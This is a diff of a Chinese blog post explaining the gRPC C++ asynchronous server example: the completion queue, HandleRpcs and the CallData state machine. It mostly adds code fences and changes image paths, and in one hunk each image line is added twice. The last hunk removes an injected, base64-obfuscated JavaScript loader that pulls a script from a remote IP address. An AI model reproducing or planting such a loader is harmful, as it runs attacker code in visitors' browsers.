@@ -3,7 +3,7 @@ title: 8.gRPC C++源码阅读 异步服务器
 tags: []
 id: '367'
 categories:
-  - - my_tutorials
+  - - rpc
     - gRPC
 date: 2019-05-24 16:09:16
 ---
@@ -14,19 +14,21 @@ grpc/src/examples/cpp/helloworld/greeter_async_server.cc:
 
 main函数很简单
 
+```cpp
 int main(int argc, char** argv) {  
 ServerImpl server;  
 server.Run();
 
 return 0;  
 }
+```
 
 ServerImpl是我们编写的类。声明了一个对象，并调用Run方法.
 
+```cpp
 void Run() {  
 std::string server_address("0.0.0.0:50051");
 
-```
 ServerBuilder builder;
 // Listen on the given address without any authentication mechanism.
 builder.AddListeningPort(server_address, grpc::InsecureServerCredentials());
@@ -42,15 +44,16 @@ std::cout << "Server listening on " << server_address << std::endl;
 
 // Proceed to the server's main loop.
 HandleRpcs();
-```
 
 }
+```
 
 和同步server代码有些类似，主要不同点是我们使用ServerBuild的AddCompletionQueue方法手工添加了一个cq,并调用HandleRpcs()方法来手工处理rpc请求。
 
 我们定义的ServerImpl类和框架类的类图如下所示，基于此分析源码事半功倍。
 
-![](http://www.anger6.com/wp-content/uploads/2019/05/image-13.png)
+![](/images/wp-content/uploads/2019/05/image-13.png)
+![](/images/wp-content/uploads/2019/05/image-13.png)
 
 和同步服务不同，ServerImpl会使用一个异步service_,即上面的WithAsyncMethod_SayHello.
 
@@ -58,21 +61,26 @@ HandleRpcs();
 
 依然使用ServerBuild来构建我们的服务。前2步一样，添加监听端口和注册服务。
 
+```cpp
 ServerBuilder builder;  
 // Listen on the given address without any authentication mechanism.  
 builder.AddListeningPort(server_address, grpc::InsecureServerCredentials());  
 // Register "service_" as the instance through which we'll communicate with  
 // clients. In this case it corresponds to an _asynchronous_ service.  
 builder.RegisterService(&service_);
+```
 
 下面我们主动添加了一个cq,同步服务中我们没有关心cq。那么这个cq是干什么的呢？
 
+```cpp
 cq_ = builder.AddCompletionQueue();
+```
 
 我们通过分析BuildAndStart的代码来看看手工添加了cq之后有什么不同吧。
 
 里面会判断是否有同步方法。
 
+```cpp
 // == Determine if the server has any syncrhonous methods ==  
 bool has_sync_methods = false;  
 for (auto it = services_.begin(); it != services_.end(); ++it) {  
@@ -90,6 +98,7 @@ break;
 }  
 }  
 }
+```
 
 第一个循环是判断所有注册的service中是否有同步方法，显然是false.
 
@@ -97,7 +106,8 @@ break;
 
 对于grpc c++框架，默认会注册一个反射插件（什么是反射？连这都不知道，那我也没办法了！！）这个插件的作用是给我们的服务提供几个方法来获取服务端提供了哪些rpc,还是有些用处。这个反射插件的类图如下所示:
 
-![](http://www.anger6.com/wp-content/uploads/2019/05/image-14.png)
+![](/images/wp-content/uploads/2019/05/image-14.png)
+![](/images/wp-content/uploads/2019/05/image-14.png)
 
 反射插件为我们的服务提供了自省的能力，客户端可以动态地获取服务端提供了哪些函数。
 
@@ -109,19 +119,23 @@ break;
 
 队列类型的判断代码如下：
 
+```cpp
 const bool is_hybrid_server =  
 has_sync_methods && num_frequently_polled_cqs > 0;
 
 if (has_sync_methods) {  
 grpc_cq_polling_type polling_type =  
 is_hybrid_server ? GRPC_CQ_NON_POLLING : GRPC_CQ_DEFAULT_POLLING;
+```
 
 同步服务线程池：
 
-![](http://www.anger6.com/wp-content/uploads/2019/05/image-16.png)
+![](/images/wp-content/uploads/2019/05/image-16.png)
+![](/images/wp-content/uploads/2019/05/image-16.png)
 
 我们的程序主要通过HandleRpcs函数来处理rpc请求。
 
+```cpp
 void HandleRpcs() {  
 new CallData(&service_, cq_.get());  
 void* tag;  
@@ -133,17 +147,18 @@ GPR_ASSERT(ok);
 static_cast(tag)->Proceed();  
 }  
 }
+```
 
 首先，声明了一个CallData对象，传入的是我们的异步服务对象和添加的cq_.看一下 CallData的构造函数，状态初始化为CREATE，然后调用Proceed函数。
 
 Proceed函数在初始状态下会调用服务对象的RequestSayHello方法：
 
+```cpp
 void Proceed() {  
 if (status_ == CREATE) {  
 // Make this instance progress to the PROCESS state.  
 status_ = PROCESS;
 
-```
  service_->RequestSayHello(&ctx_, &request_, &responder_, cq_, cq_,
                               this);
 ```
@@ -161,25 +176,28 @@ status_ = PROCESS;
 
 下面的类图描述了这个异步Request和注册的方法之间的关系：
 
-![](http://www.anger6.com/wp-content/uploads/2019/05/image-18.png)
+![](/images/wp-content/uploads/2019/05/image-18.png)
+![](/images/wp-content/uploads/2019/05/image-18.png)
 
 初始化为CallData之后，定义了2个变量。tag用于唯一标识一个请求，ok用于标识操作是否成功。
 
+```cpp
 void* tag;  
 bool ok;
+```
+最后是循环处理RPC请求 
 
-最后是循环处理RPC请求
-
+```cpp
 while (true) {  
 GPR_ASSERT(cq_->Next(&tag, &ok));  
 GPR_ASSERT(ok);  
 static_cast(tag)->Proceed();  
 }
+```
 
 在cq_上调用Next方法获取一个请求，然后进行处理。在cq_上调用Next方法循环获取请求和同步服务类似，只不过这是我们主动在cq上调用Next方法来触发的，同步服务中是框架的线程池来调用Next.
 
 这样我们知道异步服务的处理流程如下所示：
 
-![](http://www.anger6.com/wp-content/uploads/2019/05/image-17.png)
-
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
+![](/images/wp-content/uploads/2019/05/image-17.png)
+![](/images/wp-content/uploads/2019/05/image-17.png)
